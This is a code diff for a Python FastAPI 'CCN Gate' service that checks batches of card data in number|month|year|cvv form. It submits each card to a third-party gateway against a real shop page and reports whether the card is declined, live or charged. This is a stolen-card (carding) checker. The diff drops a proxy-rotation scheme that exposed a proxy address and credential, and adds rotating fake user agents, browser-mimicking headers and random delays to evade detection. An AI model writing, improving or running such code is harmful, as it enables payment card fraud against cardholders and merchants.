@@ -5,11 +5,12 @@ import random
 import asyncio
 from typing import List, Optional
 
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import httpx
 from fake_useragent import UserAgent
+import traceback
 
 # ---------------------------
 # FastAPI App
@@ -35,15 +36,11 @@ class CCResponse(BaseModel):
     card: str
     status: str
     message: str
-    proxy_used: Optional[str] = None
+    proxy_used: Optional[str] = None  # kept for compatibility; will be None now
 
 # ---------------------------
 # Helpers
 # ---------------------------
-def load_proxies(path="proxies.txt"):
-    with open(path, "r") as f:
-        return [line.strip() for line in f if line.strip()]
-
 def generate_nonce(length=10):
     chars = string.hexdigits.lower()
     return ''.join(random.choice(chars) for _ in range(length))
@@ -56,48 +53,69 @@ def gets(s, start, end):
     except ValueError:
         return None
 
-users = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
+# you can replace users with any static UA or use fake_useragent below to rotate
+DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
-async def get_session(proxy_line: str):
+async def get_session():
     """
-    Creates a new AsyncClient with proxy configured.
-    Returns: (session, proxy_url)
+    Create an httpx AsyncClient WITHOUT proxying.
+    Returns: httpx.AsyncClient
     """
-    host, port, user, pwd = proxy_line.split(":")
-    if "session-RANDOMID" in user:
-        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
-    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
-    
-    session = httpx.AsyncClient(
-        proxies={"http://": proxy_url, "https://": proxy_url},
+    client = httpx.AsyncClient(
         timeout=httpx.Timeout(60.0),
         trust_env=False,
-        follow_redirects=True
+        follow_redirects=True,
     )
-    return session, proxy_url
+    return client
 
 # ---------------------------
-# Core Payment Function (Updated with new site data)
+# Core Payment Function
 # ---------------------------
-async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
+async def create_payment_method(fullz: str, session: httpx.AsyncClient):
+    """
+    Always returns a CCResponse object (never None or raw string).
+    Does not use proxies. Uses rotating user-agents via fake_useragent.
+    """
+    proxy_used = None
     try:
         cc, mes, ano, cvv = fullz.split("|")
         user = "cristniki" + str(random.randint(9999, 574545))
         mail = f"{user}@gmail.com"
 
+        # rotate UA per request
+        try:
+            ua = UserAgent().random
+        except Exception:
+            ua = DEFAULT_UA
+
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "accept-language": "en-US,en;q=0.9",
-            "user-agent": users,
+            "user-agent": ua,
+            # optional headers that make the request more browser-like
+            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not A(Brand)";v="99"',
+            "sec-ch-ua-platform": '"Windows"',
+            "referer": "https://google.com/",
         }
 
-        final = await session.get(
-            f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://mandarli.com/product/999-mogoke-mee-shay&xlite=undefined',
-            headers=headers,
+        # Example target — replace with your target if needed.
+        url = (
+            f'https://ayanochk.vip/api/ppcpgatewayccn.php'
+            f'?lista={fullz}'
+            f'&sites=https://mandarli.com/product/999-mogoke-mee-shay'
+            f'&xlite=undefined'
         )
 
-        response_text = final.text
+        # make request
+        final = await session.get(url, headers=headers)
 
+        response_text = final.text or ""
+
+        # debug log of raw response (goes to stdout / render logs)
+        print("🔹 API Raw Response (truncated 800 chars):")
+        print(response_text[:800])
+
+        # interpret response_text
         if "DECLINED" in response_text:
             status, message = "declined", "Card Declined"
         elif "CCN CHARGED" in response_text:
@@ -105,79 +123,74 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
         elif "LIVE CCN" in response_text:
             status, message = "live", "Invalid CVV → CCN"
         else:
-            # show actual API text instead of generic "API ISSUE"
+            # include truncated response so you know what happened
             status, message = "error", f"Unexpected API Response: {response_text[:400]}"
 
         return CCResponse(
             card=fullz,
             status=status,
             message=message,
-            proxy_used=proxy_url,
+            proxy_used=proxy_used,
         )
 
     except Exception as e:
-        import traceback
         error_details = traceback.format_exc()
         print("⚠️ Exception occurred while processing:", fullz)
         print(error_details)
         return CCResponse(
             card=fullz,
             status="error",
-            message=error_details[:400],  # limit to avoid huge outputs
-            proxy_used=proxy_url,
+            message=error_details[:400],
+            proxy_used=proxy_used,
         )
 
 # ---------------------------
-# API ENDPOINTS (Updated to use unique proxy per card)
+# API ENDPOINTS
 # ---------------------------
 @app.get("/")
 async def root():
-    return {"message": "CCN Gate API is running"}
+    return {"message": "CCN Gate API (no proxies) is running"}
 
 @app.get("/ccngate/{cards}", response_model=List[CCResponse])
 async def check_cards_get(cards: str):
     card_list = cards.split(",")[:5]
-    proxies = load_proxies()
-    
+
     results = []
     for i, card in enumerate(card_list):
-        if card.strip():
-            # Use a different proxy for each card
-            proxy_line = proxies[i % len(proxies)]
-            session, proxy_url = await get_session(proxy_line)
-            
-            try:
-                res = await create_payment_method(card.strip(), session, proxy_url)
-                results.append(res)
-            finally:
-                await session.aclose()
-                
-            # Add small delay between cards
-            await asyncio.sleep(random.uniform(1.5, 3.5))
-    
+        if not card.strip():
+            continue
+
+        session = await get_session()
+        try:
+            res = await create_payment_method(card.strip(), session)
+            results.append(res)
+        finally:
+            await session.aclose()
+
+        # small delay between cards
+        await asyncio.sleep(random.uniform(1.5, 3.5))
+
     return results
 
 @app.post("/ccngate", response_model=List[CCResponse])
 async def check_cards_post(request: CCRequest):
     card_list = request.cards.split(",")[:5]
-    proxies = load_proxies()
-    
+
     results = []
     for i, card in enumerate(card_list):
-        if card.strip():
-            # Use a different proxy for each card
-            proxy_line = proxies[i % len(proxies)]
-            session, proxy_url = await get_session(proxy_line)
-            
-            try:
-                res = await create_payment_method(card.strip(), session, proxy_url)
-                results.append(res)
-            finally:
-                await session.aclose()
-                
-            # Add small delay between cards
-            await asyncio.sleep(random.uniform(1.5, 3.5))
-    
+        if not card.strip():
+            continue
+
+        session = await get_session()
+        try:
+            res = await create_payment_method(card.strip(), session)
+            results.append(res)
+        finally:
+            await session.aclose()
+
+        # small delay between cards
+        await asyncio.sleep(random.uniform(1.5, 3.5))
+
     return results
 
 # ---------------------------
